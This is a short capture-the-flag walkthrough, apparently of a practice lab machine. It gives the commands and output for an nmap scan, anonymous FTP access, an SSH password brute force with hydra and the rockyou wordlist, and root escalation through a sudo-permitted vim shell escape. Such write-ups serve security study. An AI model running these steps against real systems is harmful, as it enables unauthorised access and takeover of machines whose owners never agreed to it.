```
nmap -sC -sV -oN nmap/initial $IP
```

FTP is open
```
ftp $IP
anonymous
cd pub
get ForMitch.txt
```

user name is mitch?
```
hydra -l mitch -P ~/Downloads/rockyou.txt ssh://$IP:2222
[2222][ssh] host: 10.10.4.183   login: mitch   password: secret
```

# Priv Esc
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
```
